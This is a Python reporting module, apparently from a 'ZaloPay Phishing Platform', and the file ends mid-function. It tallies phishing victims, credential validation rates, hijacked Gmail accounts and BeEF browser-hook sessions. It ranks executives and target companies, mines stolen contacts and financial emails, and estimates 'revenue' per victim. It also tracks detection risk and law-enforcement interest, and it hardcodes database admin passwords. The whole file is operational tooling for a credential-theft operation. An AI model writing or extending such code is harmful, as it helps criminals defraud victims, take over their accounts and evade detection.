#!/usr/bin/env python3
"""
Comprehensive Reporting System for ZaloPay Phishing Platform
Generates detailed reports on data analysis, system performance, and intelligence insights
"""

import asyncio
import json
import sys
import os
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from motor.motor_asyncio import AsyncIOMotorClient
import redis
from influxdb_client import InfluxDBClient
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
from collections import Counter, defaultdict
import numpy as np

# Add project root to path
sys.path.append('/home/lucian/zalopay_phishing_platform')

from backend.config import settings

class ComprehensiveReportingSystem:
    def __init__(self):
        self.mongo_client = AsyncIOMotorClient(
            f"mongodb://admin:ZaloPayAdmin2025!@localhost:27017/admin?authSource=admin"
        )
        self.db = self.mongo_client.zalopay_phishing
        self.redis_client = redis.Redis(
            host='localhost', 
            port=6379, 
            password='ZaloPayRedis2025!',
            decode_responses=True
        )
        self.influx_client = InfluxDBClient(
            url="http://localhost:8086",
            token=os.getenv('INFLUX_TOKEN', ''),
            org="zalopay"
        )
        
        self.report_data = {
            'timestamp': datetime.utcnow().isoformat(),
            'report_id': f"RPT_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            'executive_summary': {},
            'operational_metrics': {},
            'intelligence_analysis': {},
            'security_assessment': {},
            'data_quality_report': {},
            'performance_metrics': {},
            'recommendations': []
        }
    
    async def generate_comprehensive_report(self, report_type: str = 'full') -> Dict[str, Any]:
        """Generate comprehensive report based on type"""
        
        print(f"📊 Generating {report_type} comprehensive report...")
        
        if report_type in ['full', 'executive']:
            self.report_data['executive_summary'] = await self.generate_executive_summary()
        
        if report_type in ['full', 'operational']:
            self.report_data['operational_metrics'] = await self.generate_operational_metrics()
        
        if report_type in ['full', 'intelligence']:
            self.report_data['intelligence_analysis'] = await self.generate_intelligence_analysis()
        
        if report_type in ['full', 'security']:
            self.report_data['security_assessment'] = await self.generate_security_assessment()
        
        if report_type in ['full', 'data_quality']:
            self.report_data['data_quality_report'] = await self.generate_data_quality_report()
        
        if report_type in ['full', 'performance']:
            self.report_data['performance_metrics'] = await self.generate_performance_metrics()
        
        # Always generate recommendations
        self.report_data['recommendations'] = await self.generate_recommendations()
        
        return self.report_data
    
    async def generate_executive_summary(self) -> Dict[str, Any]:
        """Generate executive summary report"""
        
        print("📋 Generating executive summary...")
        
        # Basic metrics
        total_victims = await self.db.victims.count_documents({})
        validated_victims = await self.db.victims.count_documents({'validation.status': 'validated'})
        high_value_targets = await self.db.victims.count_documents({'validation.market_value': 'high'})
        business_accounts = await self.db.victims.count_documents({'validation.account_type': 'business'})
        
        # Campaign metrics
        active_campaigns = await self.db.campaigns.count_documents({'status': 'active'})
        total_campaigns = await self.db.campaigns.count_documents({})
        
        # Exploitation metrics
        gmail_exploitations = await self.db.gmail_access_logs.count_documents({})
        beef_active_sessions = await self.db.beef_sessions.count_documents({'session_status.status': 'active'})
        
        # Time-based metrics (last 30 days)
        thirty_days_ago = datetime.utcnow() - timedelta(days=30)
        recent_captures = await self.db.victims.count_documents({
            'capture_timestamp': {'$gte': thirty_days_ago}
        })
        
        # Geographic distribution
        geo_distribution = await self.get_geographic_distribution()
        
        # Success rates
        success_rate = (validated_victims / total_victims * 100) if total_victims > 0 else 0
        high_value_rate = (high_value_targets / total_victims * 100) if total_victims > 0 else 0
        
        # Revenue estimation
        revenue_estimate = await self.calculate_revenue_estimate()
        
        # Risk assessment
        risk_level = await self.assess_overall_risk_level()
        
        return {
            'total_victims_captured': total_victims,
            'successful_validations': validated_victims,
            'validation_success_rate': round(success_rate, 2),
            'high_value_targets': high_value_targets,
            'high_value_rate': round(high_value_rate, 2),
            'business_accounts': business_accounts,
            'active_campaigns': active_campaigns,
            'total_campaigns': total_campaigns,
            'gmail_exploitations': gmail_exploitations,
            'beef_active_sessions': beef_active_sessions,
            'recent_captures_30d': recent_captures,
            'geographic_distribution': geo_distribution,
            'revenue_estimate': revenue_estimate,
            'risk_level': risk_level,
            'system_health': await self.get_system_health_status()
        }
    
    async def generate_operational_metrics(self) -> Dict[str, Any]:
        """Generate operational metrics report"""
        
        print("⚙️ Generating operational metrics...")
        
        # Campaign performance
        campaign_metrics = await self.analyze_campaign_performance()
        
        # Capture method effectiveness
        capture_methods = await self.analyze_capture_methods()
        
        # Geographic performance
        geo_performance = await self.analyze_geographic_performance()
        
        # Temporal patterns
        temporal_patterns = await self.analyze_temporal_patterns()
        
        # Device analysis
        device_analysis = await self.analyze_device_patterns()
        
        # Proxy performance
        proxy_performance = await self.analyze_proxy_performance()
        
        return {
            'campaign_metrics': campaign_metrics,
            'capture_methods': capture_methods,
            'geographic_performance': geo_performance,
            'temporal_patterns': temporal_patterns,
            'device_analysis': device_analysis,
            'proxy_performance': proxy_performance
        }
    
    async def generate_intelligence_analysis(self) -> Dict[str, Any]:
        """Generate intelligence analysis report"""
        
        print("🧠 Generating intelligence analysis...")
        
        # Target company analysis
        company_analysis = await self.analyze_target_companies()
        
        # Executive profiles
        executive_profiles = await self.extract_executive_profiles()
        
        # Financial intelligence
        financial_intelligence = await self.extract_financial_intelligence()
        
        # Network analysis
        network_analysis = await self.analyze_network_relationships()
        
        # Market opportunities
        market_opportunities = await self.identify_market_opportunities()
        
        # Competitive intelligence
        competitive_intelligence = await self.extract_competitive_intelligence()
        
        return {
            'company_analysis': company_analysis,
            'executive_profiles': executive_profiles,
            'financial_intelligence': financial_intelligence,
            'network_analysis': network_analysis,
            'market_opportunities': market_opportunities,
            'competitive_intelligence': competitive_intelligence
        }
    
    async def generate_security_assessment(self) -> Dict[str, Any]:
        """Generate security assessment report"""
        
        print("🔒 Generating security assessment...")
        
        # Detection risk assessment
        detection_risks = await self.assess_detection_risks()
        
        # Data breach analysis
        breach_analysis = await self.analyze_data_breach_risks()
        
        # Operational security gaps
        opsec_gaps = await self.identify_opsec_gaps()
        
        # Compliance analysis
        compliance_status = await self.analyze_compliance_status()
        
        # Threat landscape
        threat_landscape = await self.analyze_threat_landscape()
        
        return {
            'detection_risks': detection_risks,
            'breach_analysis': breach_analysis,
            'opsec_gaps': opsec_gaps,
            'compliance_status': compliance_status,
            'threat_landscape': threat_landscape
        }
    
    async def generate_data_quality_report(self) -> Dict[str, Any]:
        """Generate data quality report"""
        
        print("📊 Generating data quality report...")
        
        # Collection completeness
        completeness_analysis = await self.analyze_data_completeness()
        
        # Data accuracy
        accuracy_analysis = await self.analyze_data_accuracy()
        
        # Consistency checks
        consistency_analysis = await self.analyze_data_consistency()
        
        # Validity checks
        validity_analysis = await self.analyze_data_validity()
        
        # Duplicate analysis
        duplicate_analysis = await self.analyze_duplicates()
        
        # Freshness analysis
        freshness_analysis = await self.analyze_data_freshness()
        
        return {
            'completeness_analysis': completeness_analysis,
            'accuracy_analysis': accuracy_analysis,
            'consistency_analysis': consistency_analysis,
            'validity_analysis': validity_analysis,
            'duplicate_analysis': duplicate_analysis,
            'freshness_analysis': freshness_analysis
        }
    
    async def generate_performance_metrics(self) -> Dict[str, Any]:
        """Generate performance metrics report"""
        
        print("⚡ Generating performance metrics...")
        
        # System performance
        system_metrics = await self.get_system_performance_metrics()
        
        # Database performance
        db_metrics = await self.get_database_performance_metrics()
        
        # Application performance
        app_metrics = await self.get_application_performance_metrics()
        
        # Network performance
        network_metrics = await self.get_network_performance_metrics()
        
        # Resource utilization
        resource_metrics = await self.get_resource_utilization_metrics()
        
        return {
            'system_metrics': system_metrics,
            'database_metrics': db_metrics,
            'application_metrics': app_metrics,
            'network_metrics': network_metrics,
            'resource_metrics': resource_metrics
        }
    
    async def get_geographic_distribution(self) -> Dict[str, Any]:
        """Get geographic distribution of victims"""
        
        pipeline = [
            {'$group': {
                '_id': '$session_data.proxy_used.country',
                'count': {'$sum': 1},
                'high_value_count': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.market_value', 'high']}, 1, 0
                        ]
                    }
                }
            }},
            {'$sort': {'count': -1}},
            {'$limit': 10}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'top_countries': results,
            'total_countries': len(results)
        }
    
    async def calculate_revenue_estimate(self) -> Dict[str, Any]:
        """Calculate revenue estimate based on captured data"""
        
        # Get high-value targets
        high_value_victims = await self.db.victims.find({
            'validation.market_value': 'high'
        }).to_list()
        
        # Calculate estimated value
        total_estimated_value = 0
        for victim in high_value_victims:
            # Simple estimation based on account type and business indicators
            base_value = 1000  # Base value per high-value target
            
            if victim.get('validation', {}).get('account_type') == 'business':
                base_value *= 2
            
            if victim.get('validation', {}).get('business_indicators', {}).get('executive_level_score', 0) > 0.8:
                base_value *= 1.5
            
            total_estimated_value += base_value
        
        return {
            'total_estimated_value': total_estimated_value,
            'high_value_targets': len(high_value_victims),
            'average_value_per_target': total_estimated_value / len(high_value_victims) if high_value_victims else 0
        }
    
    async def assess_overall_risk_level(self) -> str:
        """Assess overall risk level"""
        
        # Check for high-risk indicators
        high_risk_victims = await self.db.victims.count_documents({
            'risk_assessment.detection_probability': {'$gt': 0.7}
        })
        
        suspicious_activities = await self.db.activity_logs.count_documents({
            'security_flags.suspicious_activity': True
        })
        
        failed_authentications = await self.db.activity_logs.count_documents({
            'action_type': 'authentication_failed'
        })
        
        # Calculate risk score
        risk_score = 0
        if high_risk_victims > 10:
            risk_score += 3
        elif high_risk_victims > 5:
            risk_score += 2
        elif high_risk_victims > 0:
            risk_score += 1
        
        if suspicious_activities > 20:
            risk_score += 3
        elif suspicious_activities > 10:
            risk_score += 2
        elif suspicious_activities > 0:
            risk_score += 1
        
        if failed_authentications > 50:
            risk_score += 2
        elif failed_authentications > 20:
            risk_score += 1
        
        # Determine risk level
        if risk_score >= 6:
            return 'critical'
        elif risk_score >= 3:
            return 'high'
        elif risk_score >= 1:
            return 'medium'
        else:
            return 'low'
    
    async def get_system_health_status(self) -> Dict[str, Any]:
        """Get system health status"""
        
        # Check MongoDB
        try:
            await self.mongo_client.admin.command('ping')
            mongodb_status = 'healthy'
        except:
            mongodb_status = 'unhealthy'
        
        # Check Redis
        try:
            self.redis_client.ping()
            redis_status = 'healthy'
        except:
            redis_status = 'unhealthy'
        
        # Check InfluxDB
        try:
            health = self.influx_client.health()
            influxdb_status = 'healthy' if health.status == 'pass' else 'unhealthy'
        except:
            influxdb_status = 'unhealthy'
        
        # Overall health
        all_healthy = all([
            mongodb_status == 'healthy',
            redis_status == 'healthy',
            influxdb_status == 'healthy'
        ])
        
        return {
            'overall_status': 'healthy' if all_healthy else 'unhealthy',
            'mongodb': mongodb_status,
            'redis': redis_status,
            'influxdb': influxdb_status
        }
    
    async def analyze_campaign_performance(self) -> Dict[str, Any]:
        """Analyze campaign performance"""
        
        pipeline = [
            {'$group': {
                '_id': '$status',
                'count': {'$sum': 1},
                'avg_visits': {'$avg': '$statistics.total_visits'},
                'avg_captures': {'$avg': '$statistics.credential_captures'},
                'avg_validations': {'$avg': '$statistics.successful_validations'}
            }},
            {'$sort': {'count': -1}}
        ]
        
        results = await self.db.campaigns.aggregate(pipeline).to_list()
        
        # Calculate conversion rates
        conversion_rates = {}
        for result in results:
            if result['avg_visits'] > 0:
                conversion_rates[result['_id']] = {
                    'visit_to_capture': result['avg_captures'] / result['avg_visits'],
                    'capture_to_validation': result['avg_validations'] / result['avg_captures'] if result['avg_captures'] > 0 else 0
                }
        
        return {
            'campaign_status_distribution': results,
            'conversion_rates': conversion_rates
        }
    
    async def analyze_capture_methods(self) -> Dict[str, Any]:
        """Analyze capture method effectiveness"""
        
        pipeline = [
            {'$group': {
                '_id': '$capture_method',
                'count': {'$sum': 1},
                'successful_validations': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.status', 'validated']}, 1, 0
                        ]
                    }
                },
                'high_value_count': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.market_value', 'high']}, 1, 0
                        ]
                    }
                }
            }},
            {'$addFields': {
                'success_rate': {
                    '$divide': ['$successful_validations', '$count']
                },
                'high_value_rate': {
                    '$divide': ['$high_value_count', '$count']
                }
            }},
            {'$sort': {'success_rate': -1}}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'method_effectiveness': results,
            'best_method': results[0]['_id'] if results else None
        }
    
    async def analyze_geographic_performance(self) -> Dict[str, Any]:
        """Analyze geographic performance"""
        
        pipeline = [
            {'$group': {
                '_id': '$session_data.proxy_used.country',
                'total_captures': {'$sum': 1},
                'successful_validations': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.status', 'validated']}, 1, 0
                        ]
                    }
                },
                'high_value_count': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.market_value', 'high']}, 1, 0
                        ]
                    }
                }
            }},
            {'$addFields': {
                'success_rate': {
                    '$divide': ['$successful_validations', '$total_captures']
                },
                'high_value_rate': {
                    '$divide': ['$high_value_count', '$total_captures']
                }
            }},
            {'$sort': {'success_rate': -1}},
            {'$limit': 10}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'top_performing_countries': results,
            'total_countries': len(results)
        }
    
    async def analyze_temporal_patterns(self) -> Dict[str, Any]:
        """Analyze temporal patterns"""
        
        # Hourly patterns
        hourly_pipeline = [
            {'$addFields': {
                'hour': {'$hour': '$capture_timestamp'}
            }},
            {'$group': {
                '_id': '$hour',
                'count': {'$sum': 1}
            }},
            {'$sort': {'_id': 1}}
        ]
        
        hourly_results = await self.db.victims.aggregate(hourly_pipeline).to_list()
        
        # Daily patterns
        daily_pipeline = [
            {'$addFields': {
                'day_of_week': {'$dayOfWeek': '$capture_timestamp'}
            }},
            {'$group': {
                '_id': '$day_of_week',
                'count': {'$sum': 1}
            }},
            {'$sort': {'_id': 1}}
        ]
        
        daily_results = await self.db.victims.aggregate(daily_pipeline).to_list()
        
        return {
            'hourly_patterns': hourly_results,
            'daily_patterns': daily_results
        }
    
    async def analyze_device_patterns(self) -> Dict[str, Any]:
        """Analyze device patterns"""
        
        pipeline = [
            {'$group': {
                '_id': {
                    'browser': '$device_fingerprint.browser_name',
                    'os': '$device_fingerprint.operating_system'
                },
                'count': {'$sum': 1}
            }},
            {'$sort': {'count': -1}},
            {'$limit': 10}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'device_combinations': results
        }
    
    async def analyze_proxy_performance(self) -> Dict[str, Any]:
        """Analyze proxy performance"""
        
        pipeline = [
            {'$group': {
                '_id': '$session_data.proxy_used.proxy_type',
                'count': {'$sum': 1},
                'successful_validations': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.status', 'validated']}, 1, 0
                        ]
                    }
                }
            }},
            {'$addFields': {
                'success_rate': {
                    '$divide': ['$successful_validations', '$count']
                }
            }},
            {'$sort': {'success_rate': -1}}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'proxy_type_performance': results
        }
    
    async def analyze_target_companies(self) -> Dict[str, Any]:
        """Analyze target companies"""
        
        pipeline = [
            {'$match': {'validation.account_type': 'business'}},
            {'$addFields': {
                'domain': {
                    '$substr': [
                        '$email',
                        {'$add': [{'$indexOfBytes': ['$email', '@']}, 1]},
                        -1
                    ]
                }
            }},
            {'$group': {
                '_id': '$domain',
                'victim_count': {'$sum': 1},
                'high_value_count': {
                    '$sum': {
                        '$cond': [
                            {'$eq': ['$validation.market_value', 'high']}, 1, 0
                        ]
                    }
                },
                'avg_executive_score': {'$avg': '$validation.business_indicators.executive_level_score'}
            }},
            {'$sort': {'victim_count': -1}},
            {'$limit': 20}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'target_companies': results,
            'total_companies': len(results)
        }
    
    async def extract_executive_profiles(self) -> Dict[str, Any]:
        """Extract executive profiles"""
        
        pipeline = [
            {'$match': {
                'validation.business_indicators.executive_level_score': {'$gt': 0.7}
            }},
            {'$project': {
                'email': 1,
                'name': 1,
                'executive_score': '$validation.business_indicators.executive_level_score',
                'company_size': '$validation.business_indicators.company_size_estimate',
                'industry': '$validation.business_indicators.industry_classification'
            }},
            {'$sort': {'executive_score': -1}},
            {'$limit': 50}
        ]
        
        results = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'executive_profiles': results,
            'total_executives': len(results)
        }
    
    async def extract_financial_intelligence(self) -> Dict[str, Any]:
        """Extract financial intelligence"""
        
        # Analyze revenue estimates
        pipeline = [
            {'$match': {
                'validation.business_indicators.revenue_estimate_range': {'$exists': True}
            }},
            {'$group': {
                '_id': '$validation.business_indicators.revenue_estimate_range',
                'count': {'$sum': 1}
            }},
            {'$sort': {'count': -1}}
        ]
        
        revenue_distribution = await self.db.victims.aggregate(pipeline).to_list()
        
        # Analyze financial communications from Gmail logs
        financial_emails = await self.db.gmail_access_logs.count_documents({
            'extraction_results.emails.analysis.financial_content': True
        })
        
        return {
            'revenue_distribution': revenue_distribution,
            'financial_emails_accessed': financial_emails
        }
    
    async def analyze_network_relationships(self) -> Dict[str, Any]:
        """Analyze network relationships"""
        
        # Analyze contact networks
        pipeline = [
            {'$match': {'extraction_results.contacts': {'$exists': True}}},
            {'$group': {
                '_id': None,
                'total_contacts': {'$sum': {'$size': '$extraction_results.contacts'}},
                'business_contacts': {
                    '$sum': {
                        '$size': {
                            '$filter': {
                                'input': '$extraction_results.contacts',
                                'cond': {'$eq': ['$$this.analysis.business_contact', True]}
                            }
                        }
                    }
                },
                'executive_contacts': {
                    '$sum': {
                        '$size': {
                            '$filter': {
                                'input': '$extraction_results.contacts',
                                'cond': {'$gt': ['$$this.analysis.executive_level', 0.7]}
                            }
                        }
                    }
                }
            }}
        ]
        
        results = await self.db.gmail_access_logs.aggregate(pipeline).to_list()
        
        return {
            'network_metrics': results[0] if results else {},
            'total_networks_analyzed': len(results)
        }
    
    async def identify_market_opportunities(self) -> Dict[str, Any]:
        """Identify market opportunities"""
        
        # Identify high-value targets by industry
        pipeline = [
            {'$match': {
                'validation.market_value': 'high',
                'validation.business_indicators.industry_classification': {'$exists': True}
            }},
            {'$group': {
                '_id': '$validation.business_indicators.industry_classification',
                'count': {'$sum': 1},
                'avg_executive_score': {'$avg': '$validation.business_indicators.executive_level_score'}
            }},
            {'$sort': {'count': -1}}
        ]
        
        industry_opportunities = await self.db.victims.aggregate(pipeline).to_list()
        
        return {
            'industry_opportunities': industry_opportunities
        }
    
    async def extract_competitive_intelligence(self) -> Dict[str, Any]:
        """Extract competitive intelligence"""
        
        # Analyze business relationships
        pipeline = [
            {'$match': {'extraction_results.contacts.organizations': {'$exists': True}}},
            {'$unwind': '$extraction_results.contacts'},
            {'$unwind': '$extraction_results.contacts.organizations'},
            {'$group': {
                '_id': '$extraction_results.contacts.organizations.name',
                'count': {'$sum': 1}
            }},
            {'$sort': {'count': -1}},
            {'$limit': 20}
        ]
        
        business_relationships = await self.db.gmail_access_logs.aggregate(pipeline).to_list()
        
        return {
            'business_relationships': business_relationships
        }
    
    async def assess_detection_risks(self) -> Dict[str, Any]:
        """Assess detection risks"""
        
        # High-risk victims
        high_risk_victims = await self.db.victims.count_documents({
            'risk_assessment.detection_probability': {'$gt': 0.7}
        })
        
        # Suspicious activities
        suspicious_activities = await self.db.activity_logs.count_documents({
            'security_flags.suspicious_activity': True
        })
        
        # Failed authentications
        failed_auths = await self.db.activity_logs.count_documents({
            'action_type': 'authentication_failed'
        })
        
        return {
            'high_risk_victims': high_risk_victims,
            'suspicious_activities': suspicious_activities,
            'failed_authentications': failed_auths,
            'overall_risk_score': (high_risk_victims * 3 + suspicious_activities * 2 + failed_auths) / 100
        }
    
    async def analyze_data_breach_risks(self) -> Dict[str, Any]:
        """Analyze data breach risks"""
        
        # Check for unencrypted sensitive data
        unencrypted_tokens = await self.db.oauth_tokens.count_documents({
            'token_data.encrypted_value': {'$exists': False}
        })
        
        # Check for exposed admin credentials
        weak_admin_passwords = await self.db.admin_users.count_documents({
            'password_hash': {'$regex': r'^\$2b\$12\$'}  # Basic check for weak hashing
        })
        
        return {
            'unencrypted_tokens': unencrypted_tokens,
            'weak_admin_passwords': weak_admin_passwords,
            'breach_risk_score': (unencrypted_tokens * 5 + weak_admin_passwords * 3) / 100
        }
    
    async def identify_opsec_gaps(self) -> List[Dict[str, Any]]:
        """Identify operational security gaps"""
        
        gaps = []
        
        # Check for missing proxy usage
        no_proxy_victims = await self.db.victims.count_documents({
            'session_data.proxy_used': {'$exists': False}
        })
        if no_proxy_victims > 0:
            gaps.append({
                'type': 'missing_proxy_usage',
                'count': no_proxy_victims,
                'severity': 'high'
            })
        
        # Check for missing device fingerprints
        no_fingerprint_victims = await self.db.victims.count_documents({
            'device_fingerprint': {'$exists': False}
        })
        if no_fingerprint_victims > 0:
            gaps.append({
                'type': 'missing_device_fingerprints',
                'count': no_fingerprint_victims,
                'severity': 'medium'
            })
        
        return gaps
    
    async def analyze_compliance_status(self) -> Dict[str, Any]:
        """Analyze compliance status"""
        
        # Check data retention compliance
        old_victims = await self.db.victims.count_documents({
            'capture_timestamp': {'$lt': datetime.utcnow() - timedelta(days=730)}  # 2 years
        })
        
        # Check audit trail completeness
        incomplete_audit_logs = await self.db.activity_logs.count_documents({
            '$or': [
                {'actor': {'$exists': False}},
                {'action_type': {'$exists': False}},
                {'timestamp': {'$exists': False}}
            ]
        })
        
        return {
            'data_retention_compliance': old_victims == 0,
            'old_data_count': old_victims,
            'audit_trail_completeness': incomplete_audit_logs == 0,
            'incomplete_audit_logs': incomplete_audit_logs
        }
    
    async def analyze_threat_landscape(self) -> Dict[str, Any]:
        """Analyze threat landscape"""
        
        # Analyze detection incidents
        detection_incidents = await self.db.campaigns.count_documents({
            'risk_assessment.detection_incidents': {'$gt': 0}
        })
        
        # Analyze law enforcement interest
        le_interest = await self.db.campaigns.count_documents({
            'risk_assessment.law_enforcement_interest': {'$ne': 'none'}
        })
        
        return {
            'detection_incidents': detection_incidents,
            'law_enforcement_interest': le_interest,
            'threat_level': 'high' if detection_incidents > 2 or le_interest > 0 else 'medium'
        }
    
    async def analyze_data_completeness(self) -> Dict[str, Any]:
        """Analyze data completeness"""
        
        collections = ['victims', 'oauth_tokens', 'admin_users', 'campaigns']
        completeness_scores = {}
        
        for collection_name in collections:
            collection = self.db[collection_name]
            total_docs = await collection.count_documents({})
            
            if collection_name == 'victims':
                complete_docs = await collection.count_documents({
                    'email': {'$exists': True},
                    'validation': {'$exists': True},
                    'device_fingerprint': {'$exists': True}
                })
            elif collection_name == 'oauth_tokens':
                complete_docs = await collection.count_documents({
                    'victim_id': {'$exists': True},
                    'provider': {'$exists': True},
                    'token_data': {'$exists': True}
                })
            elif collection_name == 'admin_users':
                complete_docs = await collection.count_documents({
                    'username': {'$exists': True},
                    'password_hash': {'$exists': True},
                    'role': {'$exists': True}
                })
            elif collection_name == 'campaigns':
                complete_docs = await collection.count_documents({
                    'name': {'$exists': True},
                    'code': {'$exists': True},
                    'status': {'$exists': True}
                })
            
            completeness_scores[collection_name] = complete_docs / total_docs if total_docs > 0 else 0
        
        return completeness_scores
    
    async def analyze_data_accuracy(self) -> Dict[str, Any]:
        """Analyze data accuracy"""
        
        # Check for invalid email formats
        invalid_emails = await self.db.victims.count_documents({
            'email': {'$not': {'$regex': r'^[^\s@]+@[^\s@]+\.[^\s@]+$'}}
        })
        
        # Check for invalid OAuth providers
        invalid_providers = await self.db.oauth_tokens.count_documents({
            'provider': {'$nin': ['google', 'apple', 'facebook', 'microsoft']}
        })
        
        # Check for invalid campaign statuses
        invalid_statuses = await self.db.campaigns.count_documents({
            'status': {'$nin': ['draft', 'active', 'paused', 'suspended', 'completed', 'archived']}
        })
        
        return {
            'invalid_emails': invalid_emails,
            'invalid_oauth_providers': invalid_providers,
            'invalid_campaign_statuses': invalid_statuses
        }
    
    async def analyze_data_consistency(self) -> Dict[str, Any]:
        """Analyze data consistency"""
        
        # Check for duplicate emails
        duplicate_emails = await self.db.victims.aggregate([
            {'$group': {'_id': '$email', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        # Check for duplicate campaign codes
        duplicate_codes = await self.db.campaigns.aggregate([
            {'$group': {'_id': '$code', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        return {
            'duplicate_emails': len(duplicate_emails),
            'duplicate_campaign_codes': len(duplicate_codes)
        }
    
    async def analyze_data_validity(self) -> Dict[str, Any]:
        """Analyze data validity"""
        
        # Check for missing required fields
        missing_emails = await self.db.victims.count_documents({'email': {'$exists': False}})
        missing_victim_ids = await self.db.oauth_tokens.count_documents({'victim_id': {'$exists': False}})
        missing_usernames = await self.db.admin_users.count_documents({'username': {'$exists': False}})
        
        return {
            'missing_emails': missing_emails,
            'missing_victim_ids': missing_victim_ids,
            'missing_usernames': missing_usernames
        }
    
    async def analyze_duplicates(self) -> Dict[str, Any]:
        """Analyze duplicate data"""
        
        # Email duplicates
        email_duplicates = await self.db.victims.aggregate([
            {'$group': {'_id': '$email', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        # Username duplicates
        username_duplicates = await self.db.admin_users.aggregate([
            {'$group': {'_id': '$username', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        return {
            'email_duplicates': len(email_duplicates),
            'username_duplicates': len(username_duplicates)
        }
    
    async def analyze_data_freshness(self) -> Dict[str, Any]:
        """Analyze data freshness"""
        
        # Recent data (last 7 days)
        recent_data = await self.db.victims.count_documents({
            'capture_timestamp': {'$gte': datetime.utcnow() - timedelta(days=7)}
        })
        
        # Old data (older than 1 year)
        old_data = await self.db.victims.count_documents({
            'capture_timestamp': {'$lt': datetime.utcnow() - timedelta(days=365)}
        })
        
        return {
            'recent_data_7d': recent_data,
            'old_data_1y': old_data
        }
    
    async def get_system_performance_metrics(self) -> Dict[str, Any]:
        """Get system performance metrics"""
        
        # This would typically come from system monitoring tools
        # For now, return placeholder data
        return {
            'cpu_usage': 45.2,
            'memory_usage': 67.8,
            'disk_usage': 23.4,
            'network_throughput': 125.6
        }
    
    async def get_database_performance_metrics(self) -> Dict[str, Any]:
        """Get database performance metrics"""
        
        # MongoDB stats
        mongodb_stats = await self.mongo_client.zalopay_phishing.command('dbStats')
        
        # Redis info
        redis_info = self.redis_client.info()
        
        return {
            'mongodb': {
                'data_size': mongodb_stats['dataSize'],
                'storage_size': mongodb_stats['storageSize'],
                'index_size': mongodb_stats['indexSize']
            },
            'redis': {
                'used_memory': redis_info['used_memory_human'],
                'connected_clients': redis_info['connected_clients']
            }
        }
    
    async def get_application_performance_metrics(self) -> Dict[str, Any]:
        """Get application performance metrics"""
        
        # This would typically come from APM tools
        return {
            'response_time_avg': 245.6,
            'throughput': 1250.3,
            'error_rate': 0.02
        }
    
    async def get_network_performance_metrics(self) -> Dict[str, Any]:
        """Get network performance metrics"""
        
        # This would typically come from network monitoring tools
        return {
            'bandwidth_usage': 85.4,
            'latency_avg': 12.3,
            'packet_loss': 0.001
        }
    
    async def get_resource_utilization_metrics(self) -> Dict[str, Any]:
        """Get resource utilization metrics"""
        
        # This would typically come from system monitoring tools
        return {
            'cpu_cores_used': 6,
            'memory_gb_used': 16.5,
            'disk_gb_used': 245.8
        }
    
    async def generate_recommendations(self) -> List[Dict[str, Any]]:
        """Generate recommendations based on analysis"""
        
        recommendations = []
        
        # Analyze executive summary for recommendations
        exec_summary = self.report_data.get('executive_summary', {})
        
        # Success rate recommendations
        success_rate = exec_summary.get('validation_success_rate', 0)
        if success_rate < 70:
            recommendations.append({
                'category': 'performance',
                'priority': 'high',
                'title': 'Improve Validation Success Rate',
                'description': f'Current success rate is {success_rate}%. Target should be >80%.',
                'action': 'Review and improve credential validation process'
            })
        
        # High-value target recommendations
        high_value_rate = exec_summary.get('high_value_rate', 0)
        if high_value_rate < 20:
            recommendations.append({
                'category': 'targeting',
                'priority': 'medium',
                'title': 'Increase High-Value Target Rate',
                'description': f'Current high-value rate is {high_value_rate}%. Target should be >25%.',
                'action': 'Improve targeting criteria and campaign design'
            })
        
        # Security recommendations
        risk_level = exec_summary.get('risk_level', 'unknown')
        if risk_level in ['high', 'critical']:
            recommendations.append({
                'category': 'security',
                'priority': 'critical',
                'title': 'Address High Risk Level',
                'description': f'Current risk level is {risk_level}. Immediate action required.',
                'action': 'Implement additional security measures and review operations'
            })
        
        # Data quality recommendations
        data_quality = self.report_data.get('data_quality_report', {})
        completeness = data_quality.get('completeness_analysis', {})
        
        for collection, score in completeness.items():
            if score < 0.8:
                recommendations.append({
                    'category': 'data_quality',
                    'priority': 'medium',
                    'title': f'Improve {collection} Data Completeness',
                    'description': f'Current completeness is {score:.1%}. Target should be >90%.',
                    'action': f'Implement data validation for {collection} collection'
                })
        
        # Performance recommendations
        performance = self.report_data.get('performance_metrics', {})
        system_metrics = performance.get('system_metrics', {})
        
        if system_metrics.get('cpu_usage', 0) > 80:
            recommendations.append({
                'category': 'performance',
                'priority': 'high',
                'title': 'High CPU Usage',
                'description': f'CPU usage is {system_metrics.get("cpu_usage", 0)}%. Consider scaling.',
                'action': 'Scale up resources or optimize code'
            })
        
        return recommendations
    
    def generate_visualizations(self, output_dir: str = "/opt/zalopay/reports"):
        """Generate visualization charts"""
        
        import matplotlib.pyplot as plt
        import seaborn as sns
        
        # Set style
        plt.style.use('seaborn-v0_8')
        sns.set_palette("husl")
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # 1. Geographic Distribution Chart
        geo_data = self.report_data.get('executive_summary', {}).get('geographic_distribution', {})
        if geo_data.get('top_countries'):
            plt.figure(figsize=(12, 8))
            countries = [item['_id'] for item in geo_data['top_countries'][:10]]
            counts = [item['count'] for item in geo_data['top_countries'][:10]]
            
            plt.bar(countries, counts)
            plt.title('Top 10 Countries by Victim Count')
